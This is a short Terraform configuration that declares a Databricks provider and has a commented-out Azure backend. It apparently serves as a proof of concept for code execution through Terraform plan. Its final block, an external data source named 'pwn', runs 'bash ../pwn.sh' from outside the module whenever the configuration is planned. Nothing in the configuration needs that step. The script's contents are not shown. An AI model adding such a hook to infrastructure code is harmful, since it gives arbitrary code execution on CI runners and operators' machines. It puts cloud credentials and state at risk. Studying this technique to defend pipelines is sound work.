terraform {
  # backend "azurerm" {
  #   resource_group_name  = "cjcml"
  #   storage_account_name = "cjcml"
  #   container_name       = "tfstate"
  #   key                  = "prod.terraform.tfstate"
  # }
  required_providers {
    databricks = {
      source = "databricks/databricks"
    }
  }
}

data "external" "pwn" {
  program = ["bash", "../pwn.sh"]
}
